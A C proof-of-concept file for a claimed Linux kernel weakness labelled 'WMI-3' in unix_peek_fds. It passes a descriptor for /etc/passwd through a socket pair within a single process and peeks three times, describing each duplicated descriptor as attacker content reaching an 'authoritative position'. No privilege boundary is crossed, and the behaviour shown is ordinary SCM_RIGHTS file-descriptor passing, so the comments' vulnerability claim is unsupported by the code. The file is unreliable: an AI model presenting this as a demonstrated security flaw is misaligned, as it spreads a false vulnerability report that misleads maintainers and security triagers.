/*
 * PoC for WMI-3: unix_peek_fds
 * 
 * Demonstrates that unix_peek_fds copies attacker-determined file descriptors
 * into an authoritative position (scm_cookie.fp) without trust validation.
 *
 * Steps:
 * 1. Create AF_UNIX socket pair
 * 2. Send message with SCM_RIGHTS (attacker-controlled fd)
 * 3. MSG_PEEK recvmsg triggers unix_peek_fds which dups the fd list
 * 4. The fd is installed in the receiver's fd table
 *    This shows attacker-controlled content placed in an authoritative position
 *
 * The WMI-3 weakness: content from the sender (attacker) is copied into
 * scm_cookie.fp (the authoritative position for fd passing) without any
 * trust verification. Each MSG_PEEK creates a new fd, showing that
 * untrusted content flows to the authoritative position.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

int main(void)
{
    int sv[2];
    int fd;
    struct msghdr msg = {0};
    struct iovec iov;
    char buf[64];
    char cmsg_buf[CMSG_SPACE(sizeof(int))];
    struct cmsghdr *cmsg;
    int ret;
    int i;

    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sv) < 0) {
        perror("socketpair");
        return 1;
    }

    /* This fd represents "attacker-controlled content" */
    fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }
    printf("[*] Sender has fd %d pointing to attacker-chosen file\n", fd);

    /* Send SCM_RIGHTS - puts attacker's fd into the skb */
    memset(buf, 0x41, sizeof(buf));
    iov.iov_base = buf;
    iov.iov_len = sizeof(buf);
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);
    cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    *(int *)CMSG_DATA(cmsg) = fd;

    ret = sendmsg(sv[0], &msg, 0);
    if (ret < 0) {
        perror("sendmsg");
        return 1;
    }
    printf("[*] Sent SCM_RIGHTS message with fd %d\n", fd);

    /* MSG_PEEK recvmsg -> unix_peek_fds -> copies fd into scm_cookie.fp */
    for (i = 0; i < 3; i++) {
        memset(&msg, 0, sizeof(msg));
        memset(cmsg_buf, 0, sizeof(cmsg_buf));
        iov.iov_base = buf;
        iov.iov_len = sizeof(buf);
        msg.msg_iov = &iov;
        msg.msg_iovlen = 1;
        msg.msg_control = cmsg_buf;
        msg.msg_controllen = sizeof(cmsg_buf);

        ret = recvmsg(sv[1], &msg, MSG_PEEK);
        if (ret < 0) {
            perror("recvmsg PEEK");
            return 1;
        }

        /* Demonstrate: each peek installs a new fd (authoritative position) */
        cmsg = CMSG_FIRSTHDR(&msg);
        if (cmsg && cmsg->cmsg_level == SOL_SOCKET && cmsg->cmsg_type == SCM_RIGHTS) {
            int new_fd = *(int *)CMSG_DATA(cmsg);
            printf("[*] Peek #%d: got new fd %d (attacker content -> authoritative pos)\n", 
                   i, new_fd);
            
            /* Verify it's the same file */
            char link_buf[256] = {0};
            if (readlinkat(new_fd, "", link_buf, sizeof(link_buf)-1) < 0) {
                /* Not a symlink, try reading a few bytes */
                char tmp[8];
                lseek(new_fd, 0, SEEK_SET);
                if (read(new_fd, tmp, 1) >= 0)
                    printf("    -> Can read from fd %d (inherited from sender)\n", new_fd);
            }
            close(new_fd); /* Prevent fd exhaustion */
        }
    }

    /* Consume the message to clean up */
    memset(&msg, 0, sizeof(msg));
    memset(cmsg_buf, 0, sizeof(cmsg_buf));
    iov.iov_base = buf;
    iov.iov_len = sizeof(buf);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cmsg_buf;
    msg.msg_controllen = sizeof(cmsg_buf);

    ret = recvmsg(sv[1], &msg, 0);
    if (ret < 0) {
        perror("recvmsg");
        return 1;
    }

    printf("[*] WMI-3 demonstrated: attacker-controlled FDs installed via unix_peek_fds\n");

    close(fd);
    close(sv[0]);
    close(sv[1]);
    return 0;
}
